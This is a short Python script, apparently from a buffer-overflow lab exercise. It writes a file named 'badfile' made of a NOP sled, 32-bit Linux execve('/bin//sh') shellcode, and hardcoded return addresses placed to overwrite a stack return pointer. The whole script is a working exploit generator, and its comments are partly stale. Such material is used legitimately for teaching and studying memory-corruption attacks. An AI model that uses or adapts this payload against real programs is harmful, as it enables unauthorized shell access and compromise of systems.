import sys 

secret_str =("\xBB\xE5\x12\x00\x00\xFF\xD3").encode('latin-1')
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 

print(len(shellcode))
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1316))
# Put the shellcode at the end 
start = 1316 - len(shellcode)
content[start:] = shellcode 

# Put the address at offset 112 
#ret = 0xffffd208 + 250
ret = 0x565562e5
ret2 = 0xffffb6f8 + 244

print(format(ret2,'#x'))

content[968:972] = (ret).to_bytes(4,byteorder='little')
content[972:976] = (ret2).to_bytes(4,byteorder='little')
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 
